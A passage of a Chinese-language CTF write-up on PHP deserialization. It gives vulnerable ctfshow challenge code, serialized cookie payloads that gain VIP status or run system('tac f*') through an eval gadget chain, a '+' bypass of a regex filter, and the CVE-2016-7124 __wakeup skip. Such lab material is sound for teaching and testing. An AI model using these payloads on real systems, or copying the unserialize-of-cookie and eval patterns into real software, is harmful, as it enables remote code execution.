class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;test);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$test</span>) + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pp</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:&#x27;</span>.<span class="hljs-variable">$len</span>.<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$test</span>.<span class="hljs-string">&#x27;;&quot;;&#125;&#x27;</span>; <span class="hljs-comment">// 构造序列化对象</span><br><span class="hljs-variable">$test_unser</span> = unserialize(<span class="hljs-variable">$pp</span>); <span class="hljs-comment">// 反序列化同时触发_destruct函数</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210612155638097.png"></p><h2 id="ctf题"><a href="#ctf题" class="headerlink" title="ctf题"></a>ctf题</h2><h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><blockquote><p>GET:username=xxxxxx&amp;password=xxxxxx</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><blockquote><p>GET:username=xxxxxx&amp;password=xxxxxx Cookie:user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username!==<span class="hljs-keyword">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>GET传入的<code>username和password</code>进入<code>login</code>，判断反序列化对象<code>user</code>后传入的<code>username和password</code>是否等于<code>login</code>传入的(即GET传入的）两个值，而<code>vipOneKeyGetFlag</code>要求两个值不相等</p><p>payload：</p><blockquote><p>GET:username=a&amp;password=b Cookie:O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>定位到eval，显然需要cat查看flag</p><blockquote><p>$code=”system(‘tac f*’)”</p></blockquote><p>那么就要使用<code>getInfo</code>方法，从而需要实例化类<code>backDoor</code>而不是类<code>Info</code>，构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//序列化$a：O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:14:&quot;backDoorcode&quot;;s:17:&quot;system(&#x27;tac f*&#x27;);&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这里会提出一个问题，在上面的PHP序列化的格式中提到：<strong>public/protected/private在序列化时</strong>，序列化不会保存方法，那上面的这行代码起什么作用</p><blockquote><p>$this-&gt;class=new backDoor();</p></blockquote><p>其实这里会把实例化的<code>backDoor</code>对象信息放到<code>ctfShowUser</code>类里再实例化为<code>ctfShowUser</code>的对象<code>a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> info();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对比上题增加了正则匹配，<code>/[oc]:\d+:/i</code>匹配在引号前的字母<code>o</code>或<code>c</code>，还有引号后的数字，再一个引号</p><p>即匹配格式<code>x : num :</code></p><p>反序列化后首字母肯定是<code>o</code>，那么就在数字前加一个<code>+</code></p><p>值得注意的是，空格在php的urlencode会编码为<code>+</code>，如果此时在数字前再加入<code>+</code>，则会把payload中的<code>+</code>编码为<code>%2B</code></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211009121949046.png"></p><p>建议做法是，先通过php的urlencode，然后手动插入<code>%2B</code></p><p>当然也可以不加urlencode，然后添加<code>+</code>，然后整体编码，但是含有private时复制不了不可见的字符，故此做法只适合不存在private属性</p><h3 id="SoFun"><a href="#SoFun" class="headerlink" title="SoFun"></a>SoFun</h3><h3 id="CVE-2016-7124-wakeup的绕过）"><a href="#CVE-2016-7124-wakeup的绕过）" class="headerlink" title="CVE-2016-7124(__wakeup的绕过）"></a>CVE-2016-7124(__wakeup的绕过）</h3><p><strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行。</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>利用如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;key))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;key == <span class="hljs-string">&#x27;flag&#x27;</span>)<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;success&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-string">&#x27;you failed 